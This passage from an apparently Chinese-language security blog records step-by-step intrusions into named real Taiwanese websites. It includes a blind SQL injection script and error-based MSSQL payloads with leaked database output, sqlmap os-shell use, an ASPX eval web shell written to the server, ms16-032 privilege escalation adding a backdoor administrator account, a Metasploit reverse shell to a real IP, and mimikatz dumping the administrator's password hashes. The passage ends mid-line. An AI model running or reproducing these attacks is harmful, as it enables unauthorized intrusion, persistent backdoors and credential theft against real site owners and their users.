max_length=<span class="number">15</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(min_length,max_length):</span><br><span class="line">        url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=%d,1,0)--+&quot;</span>%i</span><br><span class="line">        table_length=harf_find(min_length,max_length,url)</span><br><span class="line">    print(<span class="string">&quot;表的长度为：&quot;</span>+str(table_length))</span><br><span class="line">    print(<span class="string">&quot;表的长度判断结束————————————————————————————————————————————————————————————————————————————————————————————--&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">harf_find</span>(<span class="params">min_value,max_value,url</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(min_value&lt;=max_value):</span><br><span class="line">        mid_value=int((min_value+max_value)/<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">&quot;当前url为:&quot;</span>+url)</span><br><span class="line">        html_content=crawl(url,headers)</span><br><span class="line">        last_content=analysis_node(html_content)</span><br><span class="line">        print(last_content)</span><br><span class="line">        <span class="keyword">if</span> last_content:</span><br><span class="line">            min_value=mid_value+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            max_value=mid_value<span class="number">-1</span></span><br><span class="line">    mid_value=int((min_value+max_value+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ua = UserAgent()</span><br><span class="line">    headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>:ua.random&#125;</span><br><span class="line">    table_length_url=<span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(table_name) from information_schema.tables where table_schema = database() limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br><span class="line">    get_table_length(table_length_url)</span><br></pre></td></tr></table></figure><p>判断表的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(column_name) from information_schema.columns where table_name = test limit 0,1)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断列的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name = test limit 0,1),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h5 id="判断字段的长度"><a href="#判断字段的长度" class="headerlink" title="判断字段的长度"></a>判断字段的长度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if((select length(user) from test)=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><p>判断字段的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;http://www.nfca.org.tw/activity_content.php?ac01=20160901235755890&#x27; and if(ascii(substr((select user from test),1,1))=&#123;&#125;,1,0)--+&quot;</span></span><br></pre></td></tr></table></figure><h2 id="Exp2"><a href="#Exp2" class="headerlink" title="Exp2"></a>Exp2</h2><p>数据库为sqlserver</p><h3 id="判断字符、数字型、闭合方式-1"><a href="#判断字符、数字型、闭合方式-1" class="headerlink" title="判断字符、数字型、闭合方式"></a>判断字符、数字型、闭合方式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Microsoft OLE DB Provider <span class="keyword">for</span> SQL Server 错误 <span class="string">&#x27;80040e14&#x27;</span></span><br><span class="line"></span><br><span class="line">遗漏字元字串 <span class="string">&#x27; AND 显示状态Flag = 1 ORDER BY 排序 DESC &#x27;</span> 后面的引号。</span><br><span class="line"></span><br><span class="line">D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\../../../_sysadm/_Function/DB_Function.asp, 列<span class="number">158</span></span><br></pre></td></tr></table></figure><p>数字型。</p><p>判断是否是DBA</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select is_srvrolemember(&#39;sysadmin&#39;))</span><br><span class="line">select is_srvrolemember(&#39;sysadmin&#39;) </span><br></pre></td></tr></table></figure><h3 id="判断是否是站库分离"><a href="#判断是否是站库分离" class="headerlink" title="判断是否是站库分离"></a>判断是否是站库分离</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select host_name()))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select @@servername))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;RENHAI&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><p>主机名和服务器名一样，不是站库分离。</p><h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1=convert(int,(db_name()))  <span class="comment">#获取当前数据库名</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(@@version))  <span class="comment">#获取数据库版本</span></span><br><span class="line"></span><br><span class="line">1=convert(int,(<span class="keyword">select</span> <span class="keyword">quotename</span>(<span class="keyword">name</span>) <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>))) <span class="comment">#一次性获取全部数据库</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span> <span class="string">&#x27;|&#x27;</span>%<span class="number">2</span>bname%<span class="number">2</span>b<span class="string">&#x27;|&#x27;</span> <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> <span class="keyword">XML</span> <span class="keyword">PATH</span>(<span class="string">&#x27;&#x27;</span>)))  <span class="comment">#一次性获取全部数据库</span></span><br></pre></td></tr></table></figure><h4 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select &#39;|&#39; name &#39;|&#39; from master..sysdatabases FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;|master||tempdb||model||msdb||RenHai||RenHai2012||Renhai_LightSite||RenhaiDevelop||RenHai2012_bak|&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="USER信息"><a href="#USER信息" class="headerlink" title="USER信息"></a>USER信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;)) #查看是否为db_owner权限、sysadmin、public （未测试成功）如果正确则正常，否则报错</span><br><span class="line"></span><br><span class="line">1&#x3D;convert(int,(user)) #查看连接数据库的用户</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;public&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;(select IS_SRVROLEMEMBER(&#39;db_owner&#39;))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可能是 BOF 或 EOF 的值为 True，或目前的资料录已被删除。所要求的操作需要目前的资料录。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(user))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 nvarchar 值 &#39;dbo&#39; 转换成资料类型 int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select quotename(name) from RenHai..sysobjects where xtype&#x3D;&#39;U&#39; FOR XML PATH(&#39;&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将nvarchar 值&#39;[参数表][_WebVisitData][活动相簿主档][活动相簿分类][活动相簿内容][comd_list][D99_CMD][D99_Tmp][comdlist][jiaozhu][职称][订单明细暂存档][会员资料表][订单主档][订单明细档][登入纪录档][产品资料表][sysdiagrams][网站流量][系统设定档][sqlmapoutput][订单暂存档][流水号资料表][订单分类档][单位][订单状态档][太岁表][点灯位置资料表][性别表][庙宇资料表][一般分类][人员][公司基本资料] [人员权限][单位权限][权限][新闻][程式][dtproperties]&#39; 转换成资料类型int 时，转换失败。</span><br></pre></td></tr></table></figure><h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><h5 id="获取注入点的表中的列名"><a href="#获取注入点的表中的列名" class="headerlink" title="获取注入点的表中的列名"></a>获取注入点的表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 having 1&#x3D;1 --&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">资料行 &#39;新闻.流水号&#39; 在选取清单中无效，因为它并未包含在汇总函式或 GROUP BY 子句中。</span><br></pre></td></tr></table></figure><h5 id="获取任意表中的列名"><a href="#获取任意表中的列名" class="headerlink" title="获取任意表中的列名"></a>获取任意表中的列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264 and 1&#x3D;convert(int,(select * from RenHai..comd_list  where id&#x3D;(select max(id) from test..sysobjects where xtype&#x3D;&#39;u&#39; and name&#x3D;&#39;comd_list&#39;)))&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><h4 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h4><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><h6 id="判断权限"><a href="#判断权限" class="headerlink" title="判断权限"></a>判断权限</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264%20and%201&#x3D;(select%20is_srvrolemember(%27sysadmin%27))--&amp;Pageno&#x3D;1</span><br></pre></td></tr></table></figure><p>返回正常</p><p>sqlmap一把梭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; -p p0 --os-shell</span><br></pre></td></tr></table></figure><p>根据之前爆出的路径，尝试写入shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;</span><br><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br></pre></td></tr></table></figure><p>回显太慢。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; echo &#39;&lt;% @Page Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;&#39;&gt;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady2.aspx</span><br><span class="line">do you want to retrieve the command standard output? [Y&#x2F;n&#x2F;a] y</span><br><span class="line">[14:13:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;--no-cast&#39; or switch &#39;--hex&#39;</span><br><span class="line">[14:13:34] [WARNING] running in a single-thread mode. Please consider usage of option &#39;--threads&#39; for faster data retrieval</span><br><span class="line">[14:13:34] [INFO] retrieved:</span><br><span class="line">[14:13:35] [WARNING] time-based comparison requires larger statistical model, please wait..................... (done)</span><br><span class="line">[14:13:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions</span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#39;--time-sec&#39;)? [Y&#x2F;n] y</span><br><span class="line">2</span><br><span class="line">[14:13:58] [INFO] retrieved:</span><br><span class="line">[14:13:59] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)</span><br><span class="line">[14:14:14] [INFO] adjusting time delay to 2 seconds due to good response times</span><br><span class="line">這</span><br></pre></td></tr></table></figure><p>直接尝试sqlmap的–file选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sqlmap -u &quot;http:&#x2F;&#x2F;www.renhai.org.tw&#x2F;OutWeb&#x2F;L_CT&#x2F;News&#x2F;News_content.asp?p0&#x3D;264&amp;Pageno&#x3D;1&quot; --file-write&#x3D;&quot;&#x2F;Users&#x2F;apple&#x2F;Downloads&#x2F;漏洞盒子&#x2F;shell&#x2F;apsx马&#x2F;asp小马&#x2F;2.aspx&quot; --file-dest&#x3D;&quot;D:&#x2F;S_JCIN&#x2F;WEBSITE&#x2F;OUTWEB&#x2F;L_CT&#x2F;NEWS&#x2F;steady123.aspx&quot;</span><br></pre></td></tr></table></figure><p>使用os-shell命令，查看是否上传上去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; dir D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 09:08                 9 shell.aspx</span><br><span class="line">2014&#x2F;12&#x2F;17  下午 05:40               277 sidebar.asp</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:55               116 steady.aspx</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 10:56               116 steady.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  上午 11:24                 8 steady1.txt</span><br><span class="line">2020&#x2F;11&#x2F;17  下午 02:28               116 steady123.aspx</span><br></pre></td></tr></table></figure><p>查看马是否连接成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">os-shell&gt; type  D:\S_JCIN\WEBSITE\OUTWEB\L_CT\NEWS\steady123.aspx</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the command standard output? [Y/n/a] y</span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;&lt;%var PAY:String=Request[&quot;\x61\x62\x63\x64&quot;];&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">13</span>] [INFO] retrieved: <span class="string">&#x27;eval(PAY,&quot;\x75\x6E\x73\x61&quot;+&quot;\x66\x65&quot;);&#x27;</span></span><br><span class="line">[<span class="number">14</span>:<span class="number">36</span>:<span class="number">14</span>] [INFO] retrieved: <span class="string">&#x27;%&gt;&#x27;</span></span><br><span class="line">command standard output:</span><br><span class="line">---</span><br><span class="line">&lt;%@PAGE LANGUAGE=JSCRIPT%&gt;</span><br><span class="line">&lt;%<span class="keyword">var</span> PAY:<span class="keyword">String</span>=Request[<span class="string">&quot;abcd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(PAY,<span class="string">&quot;unsa&quot;</span>+<span class="string">&quot;fe&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><h5 id="exp提权"><a href="#exp提权" class="headerlink" title="exp提权"></a>exp提权</h5><p>使用ms16-032直接提权成功，添加用户，添加用户到管理员组。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;whoami&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">5364</span> created.</span><br><span class="line">==============================</span><br><span class="line">nt authority\system</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net user good gongxinao /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">1668</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功。</span><br><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; ms16<span class="number">-032.</span>exe <span class="string">&quot;net localgroup administrators good /add&quot;</span></span><br><span class="line">[<span class="comment">#] ms16-032 for service by zcgonvh</span></span><br><span class="line">[+] SeAssignPrimaryTokenPrivilege was assigned</span><br><span class="line">[!] process with pid: <span class="number">364</span> created.</span><br><span class="line">==============================</span><br><span class="line">命令執行成功</span><br></pre></td></tr></table></figure><p>查看3389是否连接成功，返回为0表示连接成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; REG QUERY <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server</span><br><span class="line">    fDenyTSConnections    REG_DWORD    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>既然是ms16-032直接msf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use  exploit&#x2F;windows&#x2F;local&#x2F;ms16_032_secondary_logon_handle_privesc</span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">[*] Started reverse TCP handler on 164.155.95.55:4444 </span><br><span class="line">[+] Compressed size: 1016</span><br><span class="line">[*] Writing payload file, C:\WINDOWS\TEMP\EnCngJ.ps1...</span><br><span class="line">[*] Compressing script contents...</span><br><span class="line">[+] Compressed size: 3564</span><br><span class="line">[*] Executing exploit script...</span><br><span class="line">[-] Exploit failed [user-interrupt]: Rex::TimeoutError Operation timed out.</span><br><span class="line">[+] Deleted C:\WINDOWS\TEMP\EnCngJ.ps1</span><br><span class="line">[-] run: Interrupted</span><br></pre></td></tr></table></figure><p>最后连接超时，百度一下原因发现。改模块需要目标系统具有powershell，而03的系统肯定是没有powershell的，但是问题来了为什么exe文件就可以提权，msf就不可以？两者的原理都是一样的，无非是形式不一样。</p><p>既然能够运行exp.exe，查看一下进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"> 5012  5372  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5060  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5096  5288  notepad.exe             x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\notepad.exe</span><br><span class="line"> 5224  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5240  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5288  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5372  2012  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5640  5644  cmd.exe                 x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe</span><br><span class="line"> 5672  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br><span class="line"> 6032  4532  powershell.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\System32\windowspowershell\v1.0\powershell.exe</span><br></pre></td></tr></table></figure><p>发现有powershell.exe。</p><p>最后直接连接3389，找到我们上传的迷你卡姿抓取密码，这里为了方便直接倒入到文件中，然后使用蚁剑下载到本地，拿到管理员账号密码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Sep 18 2020 19:18:00</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https:<span class="comment">//pingcastle.com / https://mysmartlogon.com ***/</span></span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">78368</span> (<span class="number">00000000</span>:<span class="number">00013220</span>)</span><br><span class="line">Session           : Service <span class="keyword">from</span> <span class="number">0</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : RENHAI</span><br><span class="line">Logon Server      : RENHAI</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">11</span>/<span class="number">20</span> </span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2928085508</span><span class="number">-3031473165</span><span class="number">-2762439012</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000002</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : RENHAI</span><br><span class="line"> * LM       : d7b9834aa4c07e3bd8265b84d6256f93</span><br><span class="line"> * NTLM     : <span 